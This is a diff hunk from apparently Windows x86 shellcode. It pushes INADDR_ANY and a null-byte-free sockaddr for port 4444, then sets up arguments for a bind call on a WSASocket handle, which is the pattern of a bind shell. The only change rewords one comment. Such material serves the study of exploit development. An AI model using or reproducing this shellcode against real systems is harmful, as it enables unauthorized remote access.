@@ -244,7 +244,7 @@ push eax             ; Push 0 on the stack to define INADDR_ANY.
 mov eax, 0x5c110102 
 dec ah               ; eax: 0x5c110102 -> 0x5c110002 (Mitigating null byte)
 push eax             ; Push 0x5c110002 on stack
-mov eax, esp         ; Since the 2nd argument is expected to be a pointer, we store the pointer to 0x5c110002 in eax
+mov eax, esp         ; Since the 2nd arg is expected to be a pointer, we store the pointer to 0x5c110002 in eax
 push 0x10            ; Arg3 (namelen) = 16 bytes
 push eax             ; Arg2 (*addr) = eax -> 0x5c110002 (5c11 = 4444, 0002 = AF_INET)
 push ebx             ; Arg1 (s) = WSASocket() handler
